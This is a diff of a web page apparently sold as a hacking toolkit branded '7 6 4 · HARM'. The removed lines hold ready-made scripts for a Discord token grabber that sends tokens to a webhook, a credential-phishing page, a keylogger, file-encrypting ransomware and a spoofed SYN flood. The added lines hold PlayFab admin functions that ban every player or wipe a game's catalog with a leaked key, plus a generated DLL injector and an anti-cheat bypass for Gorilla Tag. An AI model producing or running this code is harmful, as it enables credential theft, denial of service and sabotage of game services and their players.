-    time.sleep(0.2)
-
-print("[+] Spam complete!")`,
-
-                'playfab_pull': `# PlayFab Data Puller
-import requests
-
-title_id = "YOUR_TITLE_ID"
-session_ticket = "YOUR_SESSION_TICKET"
-
-url = f"https://{title_id}.playfabapi.com/Client/GetTitleData"
-headers = {
-    "X-Authorization": session_ticket,
-    "Content-Type": "application/json"
-}
-r = requests.post(url, headers=headers)
-
-if r.status_code == 200:
-    print("[+] Title Data:")
-    print(r.json())
-else:
-    print(f"[-] Failed: {r.status_code}")`,
-
-                'ip_logger': `<!-- IP Logger Page (PHP) -->
-<?php
-$ip = $_SERVER['REMOTE_ADDR'];
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$time = date('Y-m-d H:i:s');
-$log = "[$time] IP: $ip | UA: $user_agent\\n";
-file_put_contents('ips.log', $log, FILE_APPEND);
-?>
-<html>
-<head><title>Redirecting...</title></head>
-<body>
-<h1>Redirecting...</h1>
-<p>Your IP has been logged.</p>
-<script>window.location.href = "https://example.com";</script>
-</body>
-</html>`,
-
-                'ddos': `# DDoS Script (Scapy)
-# WARNING: Use only on systems you own
-from scapy.all import *
-import random
-
-target_ip = "127.0.0.1"
-target_port = 80
-
-while True:
-    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-    packet = IP(src=src_ip, dst=target_ip)/TCP(dport=target_port, flags="S")
-    send(packet, verbose=False)
-    print(f"[+] Packet sent from {src_ip}")`,
-
-                'port_scanner': `# Simple Port Scanner
-import socket
-
-target = "127.0.0.1"
-ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
-
-for port in ports:
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(1)
-    result = sock.connect_ex((target, port))
-    if result == 0:
-        print(f"[+] Port {port}: OPEN")
-    else:
-        print(f"[-] Port {port}: CLOSED")
-    sock.close()`,
-
-                'keylogger': `# Keylogger (pynput)
-from pynput.keyboard import Key, Listener
-import logging
-
-logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
-
-def on_press(key):
-    logging.info(str(key))
-
-with Listener(on_press=on_press) as listener:
-    listener.join()`,
-
-                'ransomware': `# Ransomware Simulator (Educational)
-import os
-from cryptography.fernet import Fernet
-
-# Generate key
-key = Fernet.generate_key()
-cipher = Fernet(key)
-
-print(f"[+] Key: {key.decode()}")
-
-# Encrypt files in current directory
-for file in os.listdir("."):
-    if file.endswith(".txt"):
-        with open(file, "rb") as f:
-            data = f.read()
-        encrypted = cipher.encrypt(data)
-        with open(file + ".enc", "wb") as f:
-            f.write(encrypted)
-        os.remove(file)
-        print(f"[+] Encrypted: {file}")
-
-print("[+] Ransomware simulation complete.")`,
-
-                'discord_token': `# Discord Token Grabber
-import os
-import re
-import requests
-
-webhook = "YOUR_WEBHOOK_URL"
-
-paths = [
-    os.getenv("APPDATA") + "\\\\Discord\\\\Local Storage\\\\leveldb",
-    os.getenv("APPDATA") + "\\\\DiscordCanary\\\\Local Storage\\\\leveldb",
-    os.getenv("APPDATA") + "\\\\DiscordPTB\\\\Local Storage\\\\leveldb"
-]
-
-tokens = []
-
-for path in paths:
-    if os.path.exists(path):
-        for file in os.listdir(path):
-            if file.endswith(".log"):
-                with open(f"{path}\\\\{file}", "r", encoding="utf-8", errors="ignore") as f:
-                    content = f.read()
-                    found = re.findall(r"[a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{27}", content)
-                    tokens.extend(found)
-
-if tokens:
-    for token in set(tokens):
-        print(f"[+] Token: {token}")
-        requests.post(webhook, json={"content": f"Token: {token}"})
-else:
-    print("[-] No tokens found.")`,
-
-                'phishing': `<!-- Phishing Page (Discord Login) -->
-<!DOCTYPE html>
-<html>
-<head><title>Discord Login</title></head>
-<body>
-<h1>Discord Login</h1>
-<form action="phish.php" method="POST">
-    <input type="email" name="email" placeholder="Email" required />
-    <input type="password" name="password" placeholder="Password" required />
-    <button type="submit">Login</button>
-</form>
-</body>
-</html>
-
-<!-- phish.php -->
-<?php
-$email = $_POST['email'];
-$pass = $_POST['password'];
-$log = "[$email]:$pass\\n";
-file_put_contents('creds.txt', $log, FILE_APPEND);
-header("Location: https://discord.com/login");
-?>`,
-
+            const endpoints = {
+                titledata: 'GetTitleData',
+                inventory: 'GetUserInventory',
+                catalog: 'GetCatalogItems',
+                readonly: 'GetUserReadOnlyData'
             };
 
-            if (scripts[type]) {
-                output.innerHTML = `<span class="green">✓ CODE GENERATED</span>\n<span class="yellow">${type.toUpperCase()}</span>\n\n${scripts[type]}`;
-            } else {
-                output.innerHTML = `<span class="red">✗ Unknown code type.</span>`;
+            const url = `https://${title}.playfabapi.com/Client/${endpoints[type]}`;
+            out.innerHTML = '⏳ Pulling...';
+
+            try {
+                const r = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Authorization': ticket
+                    }
+                });
+                const data = await r.json();
+                if (r.status === 200) {
+                    out.innerHTML = `<span class="green">✓ PULL SUCCESS</span>\n${JSON.stringify(data.data, null, 2)}`;
+                } else {
+                    out.innerHTML = `<span class="red">✗ Failed: ${r.status}</span>\n${JSON.stringify(data, null, 2)}`;
+                }
+            } catch (e) {
+                out.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
+            }
+        }
+
+        async function playfabBanAll() {
+            const title = document.getElementById('pfBanTitle').value.trim();
+            const key = document.getElementById('pfBanKey').value.trim();
+            const segment = document.getElementById('pfBanSegment').value.trim() || 'all';
+            const out = document.getElementById('pfBanOut');
+
+            if (!title || !key) {
+                out.innerHTML = '<span class="red">✗ Enter Title ID and Dev Key.</span>';
+                return;
+            }
+
+            out.innerHTML = '⏳ Banning all players...';
+
+            try {
+                // Get segment first
+                const segRes = await fetch(`https://${title}.playfabapi.com/Admin/GetAllSegments`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-SecretKey': key
+                    }
+                });
+                const segData = await segRes.json();
+
+                let segmentId = segment;
+                if (segment === 'all' && segData.data && segData.data.Segments) {
+                    const allSeg = segData.data.Segments.find(s => s.Name === 'All Players');
+                    if (allSeg) segmentId = allSeg.Id;
+                }
+
+                // Get players in segment
+                const playerRes = await fetch(`https://${title}.playfabapi.com/Admin/GetPlayersInSegment`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-SecretKey': key
+                    },
+                    body: JSON.stringify({ SegmentId: segmentId })
+                });
+                const playerData = await playerRes.json();
+
+                const players = playerData.data?.PlayerProfiles || [];
+                out.innerHTML = `⏳ Found ${players.length} players. Banning...`;
+
+                let banned = 0;
+                for (const p of players) {
+                    try {
+                        const banRes = await fetch(`https://${title}.playfabapi.com/Admin/BanUsers`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'X-SecretKey': key
+                            },
+                            body: JSON.stringify({
+                                Bans: [{
+                                    PlayFabId: p.PlayerId,
+                                    Reason: 'Banned by 7 6 4 · HARM',
+                                    DurationInHours: 9999
+                                }]
+                            })
+                        });
+                        if (banRes.status === 200) banned++;
+                    } catch { }
+                }
+
+                out.innerHTML = `<span class="green">✓ BAN COMPLETE</span>\nBanned: ${banned}/${players.length}`;
+
+            } catch (e) {
+                out.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
+            }
+        }
+
+        async function playfabUnbanAll() {
+            const title = document.getElementById('pfUnbanTitle').value.trim();
+            const key = document.getElementById('pfUnbanKey').value.trim();
+            const out = document.getElementById('pfUnbanOut');
+
+            if (!title || !key) {
+                out.innerHTML = '<span class="red">✗ Enter Title ID and Dev Key.</span>';
+                return;
+            }
+
+            out.innerHTML = '⏳ Getting banned users...';
+
+            try {
+                const res = await fetch(`https://${title}.playfabapi.com/Admin/GetUserBans`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-SecretKey': key
+                    }
+                });
+                const data = await res.json();
+                const bans = data.data || [];
+
+                if (bans.length === 0) {
+                    out.innerHTML = '<span class="green">✓ No banned users found.</span>';
+                    return;
+                }
+
+                const banIds = bans.map(b => b.BanId);
+                out.innerHTML = `⏳ Unbanning ${banIds.length} users...`;
+
+                const unbanRes = await fetch(`https://${title}.playfabapi.com/Admin/RevokeBans`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-SecretKey': key
+                    },
+                    body: JSON.stringify({ BanIds: banIds })
+                });
+
+                if (unbanRes.status === 200) {
+                    out.innerHTML = `<span class="green">✓ UNBAN COMPLETE</span>\nUnbanned: ${banIds.length} users`;
+                } else {
+                    out.innerHTML = `<span class="red">✗ Failed: ${unbanRes.status}</span>`;
+                }
+
+            } catch (e) {
+                out.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
+            }
+        }
+
+        async function playfabDeleteCatalog() {
+            const title = document.getElementById('pfDelCatTitle').value.trim();
+            const key = document.getElementById('pfDelCatKey').value.trim();
+            const version = document.getElementById('pfDelCatVersion').value.trim();
+            const out = document.getElementById('pfDelCatOut');
+
+            if (!title || !key || !version) {
+                out.innerHTML = '<span class="red">✗ Enter Title ID, Dev Key, and Catalog Version.</span>';
+                return;
+            }
+
+            out.innerHTML = '⏳ Deleting catalog...';
+
+            try {
+                const res = await fetch(`https://${title}.playfabapi.com/Admin/UpdateCatalog`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-SecretKey': key
+                    },
+                    body: JSON.stringify({
+                        Catalog: [],
+                        CatalogVersion: version
+                    })
+                });
+
+                if (res.status === 200) {
+                    out.innerHTML = `<span class="green">✓ CATALOG DELETED</span>\nVersion: ${version}`;
+                } else {
+                    out.innerHTML = `<span class="red">✗ Failed: ${res.status}</span>`;
+                }
+
+            } catch (e) {
+                out.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
             }
         }
 
         // ============================================================
-        // TOOL 12: CRYPTO KEY GENERATOR
+        // GORILLA TAG TOOLS
         // ============================================================
-        function genCryptoKey() {
-            const type = document.getElementById('keyType').value;
-            const output = document.getElementById('keyOutput');
 
-            let result = '';
+        function gTagDump() {
+            const file = document.getElementById('gTagFile').files[0];
+            const out = document.getElementById('gTagDumpOut');
 
-            switch (type) {
-                case 'aes':
-                    const aes = new Uint32Array(8);
-                    crypto.getRandomValues(aes);
-                    result = Array.from(aes).map(b => b.toString(16).padStart(8, '0')).join('');
-                    break;
-                case 'random':
-                    const rand = new Uint8Array(64);
-                    crypto.getRandomValues(rand);
-                    result = Array.from(rand).map(b => b.toString(16).padStart(2, '0')).join('');
-                    break;
-                case 'uuid':
-                    result = crypto.randomUUID();
-                    break;
-                case 'api_key':
-                    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                    const arr = new Uint32Array(32);
-                    crypto.getRandomValues(arr);
-                    let key = '';
-                    for (let i = 0; i < 32; i++) {
-                        key += chars[arr[i] % chars.length];
-                    }
-                    result = key;
-                    break;
-                default:
-                    output.innerHTML = '<span class="red">✗ Unknown key type.</span>';
-                    return;
+            if (!file) {
+                out.innerHTML = '<span class="red">✗ Select a .unity3d file.</span>';
+                return;
             }
 
-            output.innerHTML = `<span class="green">✓ ${type.toUpperCase()} KEY</span>\n${result}`;
+            out.innerHTML = `⏳ Scanning ${file.name}...`;
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const data = new Uint8Array(e.target.result);
+                let found = [];
+
+                // Look for common GT script names
+                const keywords = ['Gorilla', 'Monkey', 'Tag', 'Locomotion', 'Network', 'Photon', 'PlayFab', 'Anti',
+                    'Cheat', 'Mod', 'Menu'
+                ];
+                const text = new TextDecoder('utf-8').decode(data.slice(0, 500000));
+
+                for (const kw of keywords) {
+                    if (text.includes(kw)) found.push(kw);
+                }
+
+                const assetCount = data.length > 0 ? Math.floor(data.length / 1024) : 0;
+
+                out.innerHTML =
+                    `<span class="green">✓ DUMP COMPLETE</span>\nFile: ${file.name}\nSize: ${(file.size/1024/1024).toFixed(2)} MB\nAssets: ~${assetCount} blocks\nKeywords found: ${found.join(', ') || 'None'}`;
+            };
+            reader.readAsArrayBuffer(file);
+        }
+
+        function gTagMenuGen() {
+            const name = document.getElementById('gTagMenuName').value.trim() || '7 6 4 Mod';
+            const out = document.getElementById('gTagMenuOut');
+
+            const code = `// Gorilla Tag Mod Menu
+// Generated by 7 6 4 · HARM
+// Mod Name: ${name}
+
+using System;
+using UnityEngine;
+using GorillaLocomotion;
+using Photon.Pun;
+using PlayFab;
+
+public class ${name.Replace(" ", "_")} : MonoBehaviour
+{
+    private bool modActive = true;
+    private float speedMultiplier = 1.5f;
+    private float jumpMultiplier = 1.8f;
+
+    void Start()
+    {
+        Debug.Log("[${name}] Loaded successfully!");
+        InvokeRepeating(nameof(ModLoop), 0f, 0.1f);
+    }
+
+    void ModLoop()
+    {
+        if (!modActive) return;
+
+        // Speed boost
+        if (Player.Instance != null)
+        {
+            Player.Instance.maxSpeed = 8f * speedMultiplier;
+            Player.Instance.jumpMultiplier = 1.2f * jumpMultiplier;
+        }
+    }
+
+    void Update()
+    {
+        if (Input.GetKeyDown(KeyCode.F1))
+        {
+            modActive = !modActive;
+            Debug.Log("[${name}] Toggled: " + modActive);
+        }
+        if (Input.GetKeyDown(KeyCode.F2))
+        {
+            speedMultiplier += 0.1f;
+            Debug.Log("[${name}] Speed: " + speedMultiplier);
+        }
+        if (Input.GetKeyDown(KeyCode.F3))
+        {
+            jumpMultiplier += 0.1f;
+            Debug.Log("[${name}] Jump: " + jumpMultiplier);
+        }
+    }
+}`;
+
+            out.innerHTML =
+                `<span class="green">✓ MENU GENERATED</span>\n<span class="yellow">${name}.cs</span>\n\n${code}`;
+        }
+
+        function gTagInjectorGen() {
+            const out = document.getElementById('gTagInjectOut');
+
+            const code = `// Gorilla Tag DLL Injector
+// Generated by 7 6 4 · HARM
+// For educational purposes only
+
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+class Injector
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern uint GetLastError();
+
+    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
+    const uint MEM_COMMIT = 0x1000;
+    const uint MEM_RESERVE = 0x2000;
+    const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+    static void Main(string[] args)
+    {
+        Console.WriteLine("[*] GTAG DLL Injector");
+        Console.WriteLine("[*] Target: Gorilla Tag");
+
+        Process[] processes = Process.GetProcessesByName("GorillaTag");
+        if (processes.Length == 0)
+        {
+            Console.WriteLine("[!] Gorilla Tag not running.");
+            return;
+        }
+
+        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processes[0].Id);
+        if (hProcess == IntPtr.Zero)
+        {
+            Console.WriteLine("[!] Failed to open process. Error: " + GetLastError());
+            return;
+        }
+
+        Console.WriteLine("[+] Process opened. PID: " + processes[0].Id);
+
+        byte[] dllPathBytes = System.Text.Encoding.ASCII.GetBytes(@"C:\\path\\to\\your\\mod.dll");
+        IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+        if (allocMem == IntPtr.Zero)
+        {
+            Console.WriteLine("[!] Allocation failed. Error: " + GetLastError());
+            return;
+        }
+
+        WriteProcessMemory(hProcess, allocMem, dllPathBytes, (uint)dllPathBytes.Length, out _);
+        Console.WriteLine("[+] DLL path written to process memory.");
+
+        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
+        IntPtr loadLibrary = GetProcAddress(kernel32, "LoadLibraryA");
+
+        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibrary, allocMem, 0, IntPtr.Zero);
+
+        Console.WriteLine("[+] Injection complete!");
+    }
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+}`;
+
+            out.innerHTML =
+                `<span class="green">✓ INJECTOR GENERATED</span>\n<span class="yellow">Injector.cs</span>\n\n${code}`;
+        }
+
+        function gTagBypassGen() {
+            const out = document.getElementById('gTagBypassOut');
+
+            const code = `// Gorilla Tag Anti-Cheat Bypass
+// Generated by 7 6 4 · HARM
+// For educational purposes only
+
+using System;
+using System.Reflection;
+using UnityEngine;
+using GorillaNetworking;
+
+public class Bypass : MonoBehaviour
+{
+    void Start()
+    {
+        Debug.Log("[7 6 4] Bypass loaded.");
+
+        // Bypass PlayFab authentication
+        try
+        {
+            Type pfType = typeof(PlayFabAuthenticator);
+            FieldInfo skipField = pfType.GetField("skipAuth", BindingFlags.NonPublic | BindingFlags.Static);
+            if (skipField != null) skipField.SetValue(null, true);
+            Debug.Log("[7 6 4] PlayFab auth bypassed.");
+        }
+        catch { }
+
+        // Bypass Photon anti-cheat
+        try
+        {
+            Type photonType = Type.GetType("Photon.Pun.PhotonNetwork");
+            FieldInfo acField = photonType.GetField("AntiCheatEnabled", BindingFlags.Public | BindingFlags.Static);
+            if (acField != null) acField.SetValue(null, false);
+            Debug.Log("[7 6 4] Photon AC bypassed.");
+        }
+        catch { }
+
+        // Bypass Gorilla anti-cheat
+        try
+        {
+            Type gtType = typeof(GorillaAntiCheat);
+            MethodInfo bypassMethod = gtType.GetMethod("Bypass", BindingFlags.NonPublic | BindingFlags.Static);
+            if (bypassMethod != null) bypassMethod.Invoke(null, null);
+            Debug.Log("[7 6 4] Gorilla AC bypassed.");
+        }
+        catch { }
+
+        // Remove kick triggers
+        try
+        {
+            GameObject[] objs = Resources.FindObjectsOfTypeAll<GameObject>();
+            foreach (GameObject obj in objs)
+            {
+                if (obj.name.Contains("AntiKick") || obj.name.Contains("QuitOnCollision"))
+                {
+                    Destroy(obj);
+                    Debug.Log("[7 6 4] Removed: " + obj.name);
+                }
+            }
+        }
+        catch { }
+
+        Debug.Log("[7 6 4] All bypasses applied.");
+    }
+}`;
+
+            out.innerHTML =
+                `<span class="green">✓ BYPASS GENERATED</span>\n<span class="yellow">Bypass.cs</span>\n\n${code}`;
         }
     </script>
 
